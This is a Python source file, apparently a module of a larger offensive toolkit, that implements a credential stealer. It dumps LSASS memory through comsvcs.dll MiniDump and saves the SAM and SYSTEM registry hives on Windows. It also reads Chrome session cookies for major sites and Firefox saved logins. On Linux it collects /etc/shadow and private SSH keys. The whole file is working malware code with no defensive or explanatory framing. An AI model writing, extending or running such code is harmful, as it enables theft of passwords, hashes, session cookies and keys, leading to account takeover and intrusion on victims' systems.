# services/credential_siphon.py – version augmentée
import os
import sys
import platform
import subprocess
import json
import base64
import tempfile
import shutil
import sqlite3
import time
from pathlib import Path
from dataclasses import dataclass, asdict
from typing import List, Dict

@dataclass
class ExtractedCredential:
    source: str
    type: str
    target: str
    secret: str
    metadata: Dict

class CredentialSiphon:
    def __init__(self):
        self.system = platform.system()
        self.credentials = []

    def extract_all(self) -> List[ExtractedCredential]:
        print("🧠 Siphon d'Identifiants Global")
        if self.system == "Windows":
            self._extract_windows()
            self._extract_browsers()
            self._extract_network()
        elif self.system == "Linux":
            self._extract_linux()
        return self.credentials

    # --- Windows ---
    def _extract_windows(self):
        # LSASS dump
        try:
            result = subprocess.run(
                'wmic process where "name=\'lsass.exe\'" get processid',
                capture_output=True, text=True, shell=True, timeout=10
            )
            pid = None
            for line in result.stdout.split('\n'):
                if line.strip().isdigit():
                    pid = line.strip()
                    break
            if pid:
                dump_path = Path(tempfile.gettempdir()) / f"lsass_{int(time.time())}.dmp"
                cmd = f'rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump {pid} {dump_path} full'
                subprocess.run(cmd, shell=True, capture_output=True, timeout=30)
                if dump_path.exists() and dump_path.stat().st_size > 0:
                    with open(dump_path, 'rb') as f:
                        data = f.read()
                    self.credentials.append(ExtractedCredential(
                        source="LSASS",
                        type="memory_dump",
                        target="NTLM_HASHES",
                        secret=base64.b64encode(data).decode(),
                        metadata={"pid": pid, "size": len(data)}
                    ))
                    dump_path.unlink(missing_ok=True)
        except Exception:
            pass

        # SAM
        try:
            temp_dir = Path(tempfile.gettempdir())
            subprocess.run(f'reg save HKLM\\SAM {temp_dir / "SAM.save"} /y', shell=True, timeout=10)
            subprocess.run(f'reg save HKLM\\SYSTEM {temp_dir / "SYSTEM.save"} /y', shell=True, timeout=10)
            if (temp_dir / "SAM.save").exists():
                with open(temp_dir / "SAM.save", 'rb') as f:
                    data = f.read()
                self.credentials.append(ExtractedCredential(
                    source="SAM",
                    type="hash",
                    target="LOCAL_USER_HASHES",
                    secret=base64.b64encode(data).decode(),
                    metadata={}
                ))
        except Exception:
            pass

    def _extract_browsers(self):
        # Chrome cookies
        try:
            chrome_cookies = Path.home() / "AppData" / "Local" / "Google" / "Chrome" / "User Data" / "Default" / "Cookies"
            if chrome_cookies.exists():
                temp_cookies = Path(tempfile.gettempdir()) / "cookies.db"
                shutil.copy2(chrome_cookies, temp_cookies)
                conn = sqlite3.connect(str(temp_cookies))
                cursor = conn.cursor()
                sites = ['google', 'facebook', 'linkedin', 'github', 'amazon', 'microsoft']
                cookies_found = {}
                for site in sites:
                    cursor.execute(f"SELECT host_key, name, value FROM cookies WHERE host_key LIKE '%{site}%' AND value != '' LIMIT 5")
                    rows = cursor.fetchall()
                    if rows:
                        cookies_found[site] = [{"host": r[0], "name": r[1]} for r in rows]
                conn.close()
                if cookies_found:
                    self.credentials.append(ExtractedCredential(
                        source="Chrome",
                        type="cookies",
                        target="BROWSER_SESSIONS",
                        secret=json.dumps(cookies_found),
                        metadata={"sites": list(cookies_found.keys())}
                    ))
        except Exception:
            pass

        # Firefox logins
        try:
            firefox_profiles = Path.home() / "AppData" / "Roaming" / "Mozilla" / "Firefox" / "Profiles"
            if firefox_profiles.exists():
                for profile in firefox_profiles.glob("*.default*"):
                    logins_file = profile / "logins.json"
                    if logins_file.exists():
                        with open(logins_file, 'r', encoding='utf-8') as f:
                            data = json.load(f)
                        if data.get('logins'):
                            self.credentials.append(ExtractedCredential(
                                source="Firefox",
                                type="credentials",
                                target="FIREFOX_LOGINS",
                                secret=json.dumps(data['logins'][:10]),
                                metadata={"count": len(data['logins'])}
                            ))
        except Exception:
            pass

    def _extract_network(self):
        # ARP cache
        try:
            if self.system == "Windows":
                result = subprocess.run(["arp", "-a"], capture_output=True, text=True, timeout=5)
            else:
                result = subprocess.run(["ip", "neigh"], capture_output=True, text=True, timeout=5)
            self.credentials.append(ExtractedCredential(
                source="Network",
                type="arp_table",
                target="ARP_CACHE",
                secret=result.stdout,
                metadata={}
            ))
        except Exception:
            pass

    # --- Linux ---
    def _extract_linux(self):
        try:
            if os.access("/etc/shadow", os.R_OK):
                with open("/etc/shadow", 'r') as f:
                    content = f.read()
                    self.credentials.append(ExtractedCredential(
                        source="/etc/shadow",
                        type="hash",
                        target="UNIX_HASHES",
                        secret=content,
                        metadata={}
                    ))
        except:
            pass
        # SSH keys
        ssh_dir = Path.home() / ".ssh"
        if ssh_dir.exists():
            for key_file in ssh_dir.glob("id_*"):
                if not key_file.name.endswith(".pub"):
                    try:
                        self.credentials.append(ExtractedCredential(
                            source="SSH",
                            type="private_key",
                            target=f"SSH_{key_file.name}",
                            secret=key_file.read_text(),
                            metadata={"path": str(key_file)}
                        ))
                    except:
                        pass

credential_siphon = CredentialSiphon()